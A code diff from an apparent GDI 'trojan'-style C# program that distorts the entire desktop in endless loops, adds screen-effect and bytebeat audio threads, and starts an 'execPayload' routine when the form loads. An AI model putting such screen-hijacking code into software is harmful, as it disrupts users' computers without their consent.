@@ -108,31 +108,36 @@ namespace Hiphenatus
             byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
 
             Random random = new Random();
-            while (true)
+            try
             {
-                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
-                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
-
-                Parallel.For(8, size, i =>
+                while (true)
                 {
-                    rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 3 + 2] - 1);
-                    rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 3 + 1] - 1);
-                    rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 3 + 0] - 1);
+                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
 
-                });
-                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
-                BitBlt(hdc, random.Next(-5, 5), random.Next(-5, 5), x, y, mdc, 0, 0, SRCPAINT);
+                    Parallel.For(8, size, i =>
+                    {
+                        rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 3 + 2] - 1);
+                        rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 3 + 1] - 1);
+                        rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 3 + 0] - 1);
 
-                Thread.Sleep(1);
+                    });
+                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
+                    BitBlt(hdc, random.Next(-5, 5), random.Next(-5, 5), x, y, mdc, 0, 0, SRCPAINT);
+
+                    Thread.Sleep(1);
+                }
             }
-
-            SelectObject(mdc, oldObject);
-            ReleaseDC(IntPtr.Zero, hdc);
-            DeleteObject(bitmap);
-            DeleteDC(hdc);
-            DeleteDC(mdc);
+            catch (ThreadAbortException)
+            {
+                SelectObject(mdc, oldObject);
+                ReleaseDC(IntPtr.Zero, hdc);
+                DeleteObject(bitmap);
+                DeleteDC(hdc);
+                DeleteDC(mdc);
+            }
+            
         }
-
         public static void Shader2()
         {
             int x = GetSystemMetrics(SM_CXSCREEN);
@@ -162,31 +167,36 @@ namespace Hiphenatus
             byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
 
             Random random = new Random();
-            while (true)
+            try
             {
-                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
-                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
-
-                Parallel.For(8, size, i =>
+                while (true)
                 {
-                    rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 3 + 0]);
-                    rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 3 + 1]);
-                    rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 3 + 2]);
+                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
 
-                });
-                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
-                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
+                    Parallel.For(8, size, i =>
+                    {
+                        rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 3 + 0]);
+                        rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 3 + 1]);
+                        rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 3 + 2]);
 
-                Thread.Sleep(1);
+                    });
+                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
+                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
+
+                    Thread.Sleep(1);
+                }
             }
 
-            SelectObject(mdc, oldObject);
-            ReleaseDC(IntPtr.Zero, hdc);
-            DeleteObject(bitmap);
-            DeleteDC(hdc);
-            DeleteDC(mdc);
+            catch (ThreadAbortException)
+            {
+                SelectObject(mdc, oldObject);
+                ReleaseDC(IntPtr.Zero, hdc);
+                DeleteObject(bitmap);
+                DeleteDC(hdc);
+                DeleteDC(mdc);
+            }
         }
-
         public static void Shader3()
         {
             int x = GetSystemMetrics(SM_CXSCREEN);
@@ -216,31 +226,35 @@ namespace Hiphenatus
             byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
 
             Random random = new Random();
-            while (true)
+            try
             {
-                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
-                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
-
-                Parallel.For(8, size, i =>
+                while (true)
                 {
-                    rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 2 + 2]);
-                    rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 2 + 1]);
-                    rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 2 + 2]);
+                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
 
-                });
-                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
-                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
+                    Parallel.For(8, size, i =>
+                    {
+                        rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 2 + 2]);
+                        rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 2 + 1]);
+                        rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 2 + 2]);
 
-                Thread.Sleep(1);
+                    });
+                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
+                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
+
+                    Thread.Sleep(1);
+                }
             }
-
-            SelectObject(mdc, oldObject);
-            ReleaseDC(IntPtr.Zero, hdc);
-            DeleteObject(bitmap);
-            DeleteDC(hdc);
-            DeleteDC(mdc);
+            catch (ThreadAbortException)
+            {
+                SelectObject(mdc, oldObject);
+                ReleaseDC(IntPtr.Zero, hdc);
+                DeleteObject(bitmap);
+                DeleteDC(hdc);
+                DeleteDC(mdc);
+            }
         }
-
         public static void Shader4()
         {
             int x = GetSystemMetrics(SM_CXSCREEN);
@@ -270,31 +284,36 @@ namespace Hiphenatus
             byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
 
             Random random = new Random();
-            while (true)
+            try
             {
-                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
-                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
-
-                Parallel.For(8, size, i =>
+                while (true)
                 {
-                    rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 3 + 2] * rgbArray[i * 3 + 1]);
-                    rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 3 + 1] * rgbArray[i * 3 + 0]);
-                    rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 3 + 0] * rgbArray[i * 3 + 2]);
+                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
 
-                });
-                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
-                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
+                    Parallel.For(8, size, i =>
+                    {
+                        rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 3 + 2] * rgbArray[i * 3 + 1]);
+                        rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 3 + 1] * rgbArray[i * 3 + 0]);
+                        rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 3 + 0] * rgbArray[i * 3 + 2]);
 
-                Thread.Sleep(1);
+                    });
+                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
+                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
+
+                    Thread.Sleep(1);
+                }
             }
-
-            SelectObject(mdc, oldObject);
-            ReleaseDC(IntPtr.Zero, hdc);
-            DeleteObject(bitmap);
-            DeleteDC(hdc);
-            DeleteDC(mdc);
+            catch (ThreadAbortException)
+            {
+                SelectObject(mdc, oldObject);
+                ReleaseDC(IntPtr.Zero, hdc);
+                DeleteObject(bitmap);
+                DeleteDC(hdc);
+                DeleteDC(mdc);
+            }
+            ;
         }
-
         public static void Shader5()
         {
             int x = GetSystemMetrics(SM_CXSCREEN);
@@ -324,29 +343,35 @@ namespace Hiphenatus
             byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
 
             double ok = 0;
-            while (true)
+            try
             {
-                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
-                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
-
-                Parallel.For(8, size, i =>
+                while (true)
                 {
-                    rgbArray[i * 3 + 2] = (byte)(Math.Sin(i) * Math.Tan(i/ Math.Sin(ok)));
-                    rgbArray[i * 3 + 1] = (byte)(Math.Cos(i) * Math.Tan(i/ Math.Sin(ok)));
-                    rgbArray[i * 3 + 0] = (byte)(Math.Sin(i) * Math.Tan(i/ Math.Sin(ok)));
+                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
 
-                });
-                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
-                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
-                ok += 0.000000001;
-                Thread.Sleep(1);
+                    Parallel.For(8, size, i =>
+                    {
+                        rgbArray[i * 3 + 2] = (byte)(Math.Sin(i) * Math.Tan(i / Math.Sin(ok)));
+                        rgbArray[i * 3 + 1] = (byte)(Math.Cos(i) * Math.Tan(i / Math.Sin(ok)));
+                        rgbArray[i * 3 + 0] = (byte)(Math.Sin(i) * Math.Tan(i / Math.Sin(ok)));
+
+                    });
+                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
+                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
+                    ok += 0.000000001;
+                    Thread.Sleep(1);
+                }
             }
-
-            SelectObject(mdc, oldObject);
-            ReleaseDC(IntPtr.Zero, hdc);
-            DeleteObject(bitmap);
-            DeleteDC(hdc);
-            DeleteDC(mdc);
+            catch (ThreadAbortException)
+            {
+                SelectObject(mdc, oldObject);
+                ReleaseDC(IntPtr.Zero, hdc);
+                DeleteObject(bitmap);
+                DeleteDC(hdc);
+                DeleteDC(mdc);
+            }
+            ;
         }
         public static void Shader6()
         {
@@ -376,30 +401,35 @@ namespace Hiphenatus
 
             byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
             int sigma = 1;
-            while (true)
+            try
             {
-                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
-                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
-
-                Parallel.For(8, size, i =>
+                while (true)
                 {
-                    rgbArray[i * 3 + 2] = (byte)(Math.Sqrt(rgbArray[i * 3 + 2]) * (i / (Math.Tan(sigma) * sigma)));
-                    rgbArray[i * 3 + 1] = (byte)(Math.Sqrt(rgbArray[i * 3 + 1]) * (i / (Math.Tan(sigma) * sigma)));
-                    rgbArray[i * 3 + 0] = (byte)(Math.Sqrt(rgbArray[i * 3 + 0]) * (i / (Math.Tan(sigma) * sigma)));
+                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
 
-                });
-                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
-                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCERASE);
-                //ci(sigma, sigma, sigma*2, sigma*2);
-                sigma++;
-                Thread.Sleep(1);
+                    Parallel.For(8, size, i =>
+                    {
+                        rgbArray[i * 3 + 2] = (byte)(Math.Sqrt(rgbArray[i * 3 + 2]) * (i / (Math.Tan(sigma) * sigma)));
+                        rgbArray[i * 3 + 1] = (byte)(Math.Sqrt(rgbArray[i * 3 + 1]) * (i / (Math.Tan(sigma) * sigma)));
+                        rgbArray[i * 3 + 0] = (byte)(Math.Sqrt(rgbArray[i * 3 + 0]) * (i / (Math.Tan(sigma) * sigma)));
+
+                    });
+                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
+                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCERASE);
+                    //ci(sigma, sigma, sigma*2, sigma*2);
+                    sigma++;
+                    Thread.Sleep(1);
+                }
             }
-
-            SelectObject(mdc, oldObject);
-            ReleaseDC(IntPtr.Zero, hdc);
-            DeleteObject(bitmap);
-            DeleteDC(hdc);
-            DeleteDC(mdc);
+            catch (ThreadAbortException)
+            {
+                SelectObject(mdc, oldObject);
+                ReleaseDC(IntPtr.Zero, hdc);
+                DeleteObject(bitmap);
+                DeleteDC(hdc);
+                DeleteDC(mdc);
+            }
         }
         public void ci(int x, int y, int w, int h)
         {
@@ -585,13 +615,18 @@ namespace Hiphenatus
             shader6Thread.Abort();
             bytebeat4.Abort();
 
+            Thread.Sleep(8000);
+
+            Thread shader7Thread = new Thread(Shader6); shader7Thread.Start();
+            Thread bytebeat5 = new Thread(Beat11); bytebeat5.Start();
+
         }
 
 
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            Shader6();
+            execPayload();
 #if DEBUG
             Console.WriteLine("Form1 loaded!");
 #endif
